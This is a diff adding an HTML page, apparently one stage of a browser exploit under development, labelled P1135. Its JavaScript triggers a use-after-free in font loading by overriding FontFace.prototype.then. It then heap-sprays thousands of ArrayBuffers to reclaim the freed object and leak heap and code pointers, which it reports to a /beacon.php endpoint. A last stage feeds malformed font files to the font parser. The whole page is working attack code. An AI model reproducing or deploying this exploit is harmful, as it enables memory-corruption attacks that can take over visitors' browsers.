@@ -1,0 +1,257 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1135</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1135: READ Q11 TARGET OBJECT ===');
+log('info','Strategy: UAF→read q11→mass spray→find buffer overlapping q11→read vtable');
+B('P1135-START','t='+Date.now());
+
+// ===== PHASE 1: Trigger UAF with heavy spray to get q11 =====
+var r=Date.now()%100000;
+var uafHit=false,q11Addr=null,q13Addr=null,uafBuf=null;
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:t"+r+";src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var ff=new FontFace('u'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  // Heavy spray: 100 buffers at 192 bytes
+  uafBuf=[];
+  for(var i=0;i<100;i++)uafBuf.push(new ArrayBuffer(192));
+  try{document.fonts.check('1em t'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em u'+r+', t'+r,'AB').then(function(){},function(){});
+
+// Scan for CSSFontFace at ms=5
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!uafBuf){
+    B('P1135-MISS','no_uaf');
+    log('fail','No UAF hit this boot - retrying on next reload');
+    return;
+  }
+
+  for(var bi=0;bi<uafBuf.length;bi++){
+    var b=new BigUint64Array(uafBuf[bi]);
+    if(b[0]===1n&&b[11]!==0n&&b[13]!==0n){
+      var h11=Number(b[11]>>32n),h13=Number(b[13]>>32n);
+      if(h11>=0x10&&h11<=0xFF&&h13>=0x10&&h13<=0xFF){
+        var allZ=true;
+        for(var z=1;z<=10;z++)if(b[z]!==0n){allZ=false;break;}
+        if(!allZ||b[12]!==0n)continue;
+
+        q11Addr=b[11];
+        q13Addr=b[13];
+        log('win','UAF HIT! q11='+hex64(q11Addr)+' q13='+hex64(q13Addr));
+        B('P1135-UAF','bi='+bi+'|q11='+hex64(q11Addr)+'|q13='+hex64(q13Addr));
+
+        // ===== PHASE 2: Mass spray to hit q11 target =====
+        // q11 points to an object ~0x10009xxxxx range
+        // Create thousands of ArrayBuffers to fill that heap region
+        // Each buffer gets a unique marker so we can identify which one hit
+
+        log('info','Phase 2: Spraying 5000 buffers to hit q11 target...');
+
+        // Use multiple size classes to cover different bmalloc zones
+        // q11's target object is likely 64-256 bytes
+        var SPRAY_SIZES=[64,96,128,192,256];
+        var SPRAY_COUNT=1000; // per size = 5000 total
+        var sprayBufs=[];
+
+        for(var si=0;si<SPRAY_SIZES.length;si++){
+          var sz=SPRAY_SIZES[si];
+          for(var k=0;k<SPRAY_COUNT;k++){
+            var ab=new ArrayBuffer(sz);
+            var view=new BigUint64Array(ab);
+            // Write unique marker: size class + index
+            view[0]=BigInt('0xAAAA'+si.toString(16).padStart(4,'0')+k.toString(16).padStart(8,'0'));
+            if(view.length>1)view[1]=BigInt('0xBBBB'+si.toString(16).padStart(4,'0')+k.toString(16).padStart(8,'0'));
+            sprayBufs.push({ab:ab,view:view,si:si,k:k,sz:sz});
+          }
+        }
+
+        B('P1135-SPRAY','count='+sprayBufs.length);
+        log('info','Sprayed '+sprayBufs.length+' buffers');
+
+        // ===== PHASE 3: Now FREE the q11 target =====
+        // The CSSFontFace cleanup should eventually free the object at q11
+        // But we proved the CSSFontFace is a zombie... it stays alive
+        //
+        // DIFFERENT APPROACH: Don't try to free q11's target.
+        // Instead, check if any spray buffer HAPPENS to be adjacent to q11's target
+        // by writing a marker and checking if reading at q11+offset sees our marker
+        //
+        // We CAN'T read at q11 directly. But if a spray buffer landed AT q11,
+        // its marker would be there. We can use ANOTHER UAF to read q11.
+
+        // Let's try: trigger a SECOND UAF, but this time DON'T spray.
+        // Instead, let q11's newly freed CSSFontFaceSource (or whatever q11 is)
+        // get reclaimed by one of our existing spray buffers.
+
+        // Actually, we CAN'T read at arbitrary addresses from JS.
+        // The ONLY way to read q11's content is if q11's object IS one of our buffers.
+
+        // KEY INSIGHT: Create a second FontFace UAF.
+        // Its CSSFontFace is a NEW object. Its q11 might point to a DIFFERENT address.
+        // But the 5000 spray buffers are sitting in the heap.
+        // If the SECOND UAF's CSSFontFace landed ON TOP of one of our spray buffers,
+        // we'd see the CSSFontFace data appear in that spray buffer!
+
+        log('info','Phase 3: Scanning spray buffers for unexpected CSSFontFace data...');
+
+        var cffFound=[];
+        for(var j=0;j<sprayBufs.length;j++){
+          var sv=sprayBufs[j].view;
+          // Check if this buffer's marker was overwritten
+          var expectedMarker=BigInt('0xAAAA'+sprayBufs[j].si.toString(16).padStart(4,'0')+sprayBufs[j].k.toString(16).padStart(8,'0'));
+          if(sv[0]!==expectedMarker&&sv[0]!==0n){
+            // Something overwrote our marker!
+            var isRefcount=sv[0]===1n;
+            var dump=[];
+            for(var q=0;q<Math.min(sv.length,8);q++){
+              if(sv[q]!==0n)dump.push('q'+q+'='+hex64(sv[q]));
+            }
+            if(dump.length>0){
+              cffFound.push({j:j,sz:sprayBufs[j].sz,refcount:isRefcount,dump:dump.join(',')});
+              if(isRefcount){
+                log('win','SPRAY OVERLAP! buf['+j+'] sz='+sprayBufs[j].sz+': '+dump.join(' '));
+              }
+            }
+          }
+        }
+
+        B('P1135-OVERLAP','found='+cffFound.length);
+        if(cffFound.length>0){
+          for(var c=0;c<Math.min(cffFound.length,5);c++){
+            B('P1135-OVERLAP-'+c,JSON.stringify(cffFound[c]));
+          }
+        }
+
+        // ===== PHASE 4: Trigger second UAF, let it land on a spray buffer =====
+        log('info','Phase 4: Second UAF to find spray buffer overlap...');
+
+        var r2=r+99999;
+        var hit2=false;
+
+        var st2=document.createElement('style');
+        st2.textContent="@font-face{font-family:t2"+r2+";src:local(Arial);unicode-range:U+0044;}";
+        document.head.appendChild(st2);
+        var ff2=new FontFace('u2'+r2,'local(Helvetica)',{unicodeRange:'U+0043'});
+        document.fonts.add(ff2);void ff2.loaded;
+
+        Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+          if(hit2)return undefined;hit2=true;
+          if(st2.parentNode)st2.remove();
+          try{document.fonts.delete(this);}catch(e){}
+          document.body.offsetHeight;
+          // DON'T spray new buffers - let the freed CSSFontFace land on existing spray
+          try{document.fonts.check('1em t2'+r2);}catch(e){}
+          return undefined;
+        },set:function(){}});
+
+        document.fonts.load('1em u2'+r2+', t2'+r2,'AB').then(function(){},function(){});
+
+        setTimeout(function(){
+          delete FontFace.prototype.then;
+
+          // Now scan ALL spray buffers again for CSSFontFace data
+          var newCFF=[];
+          for(var j=0;j<sprayBufs.length;j++){
+            var sv=sprayBufs[j].view;
+            // Look for refcount=1 pattern (CSSFontFace landed here)
+            if(sv[0]===1n&&sv.length>=14){
+              var hasPtr=false;
+              for(var q=1;q<=13;q++){
+                if(sv[q]!==0n){
+                  var hv=Number(sv[q]>>32n);
+                  if(hv>=0x10&&hv<=0xFF)hasPtr=true;
+                  if(hv>=0x200&&hv<=0x7FFF){
+                    // CODE POINTER FOUND!
+                    log('win','CODE PTR in spray buf['+j+'] q'+q+'='+hex64(sv[q]));
+                    B('P1135-CODE','j='+j+'|q='+q+'|val='+hex64(sv[q]));
+                  }
+                }
+              }
+              if(hasPtr){
+                var dump2=[];
+                for(var q=0;q<Math.min(sv.length,24);q++){
+                  if(sv[q]!==0n)dump2.push('q'+q+'='+hex64(sv[q]));
+                }
+                newCFF.push({j:j,sz:sprayBufs[j].sz,dump:dump2.join(',')});
+                log('ptr','CFF in spray['+j+'] sz='+sprayBufs[j].sz+': '+dump2.slice(0,6).join(' '));
+              }
+            }
+          }
+
+          B('P1135-CFF2','found='+newCFF.length);
+          for(var c=0;c<Math.min(newCFF.length,3);c++){
+            B('P1135-CFF2-'+c,newCFF[c].dump.substring(0,500));
+          }
+
+          // ===== PHASE 5: Font parser attack =====
+          // Try loading a malformed font via data: URI
+          // OpenType/TrueType minimum header is 12 bytes (offset table)
+          log('info','Phase 5: Malformed font data: URI test...');
+
+          var fontTests=[
+            // Truncated OTF header (just magic + numTables)
+            'data:font/opentype;base64,'+btoa('\x00\x01\x00\x00\x00\x01\x00\x10\x00\x01\x00\x00'),
+            // WOFF with bad totalSfntSize
+            'data:font/woff;base64,'+btoa('wOFF\x00\x01\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00'),
+            // TTC header with huge numFonts
+            'data:font/collection;base64,'+btoa('ttcf\x00\x02\x00\x00\xFF\xFF\xFF\xFF'),
+            // SVG font (might trigger XML parser)
+            'data:image/svg+xml;base64,'+btoa('<svg xmlns="http://www.w3.org/2000/svg"><defs><font id="f"><font-face font-family="evil"/><glyph unicode="A" d="M0 0L100 0L100 100Z"/></font></defs></svg>')
+          ];
+
+          var fontResults=[];
+          for(var fi=0;fi<fontTests.length;fi++){
+            (function(idx,src){
+              try{
+                var testFF=new FontFace('font_'+idx,src);
+                testFF.load().then(function(){
+                  fontResults.push(idx+'=loaded');
+                  B('P1135-FONT','idx='+idx+'|loaded');
+                }).catch(function(e){
+                  fontResults.push(idx+'=err:'+e.message.substring(0,50));
+                });
+              }catch(e){
+                fontResults.push(idx+'=except:'+e.message.substring(0,50));
+              }
+            })(fi,fontTests[fi]);
+          }
+
+          setTimeout(function(){
+            B('P1135-FONTS',fontResults.join('|'));
+            log('info','Font tests: '+fontResults.join('; '));
+
+            // FINAL REPORT
+            B('P1135-DONE','uaf1='+hex64(q11Addr)+'|spray='+sprayBufs.length+'|overlap='+cffFound.length+'|cff2='+newCFF.length);
+            log('phase','=== DONE ===');
+          },500);
+        },20);
+
+        break; // Only process first UAF hit
+      }
+    }
+  }
+
+  if(!q11Addr){
+    B('P1135-MISS','no_pattern');
+    log('fail','No CSSFontFace pattern found - miss this boot');
+  }
+},8);
+</script></body></html>
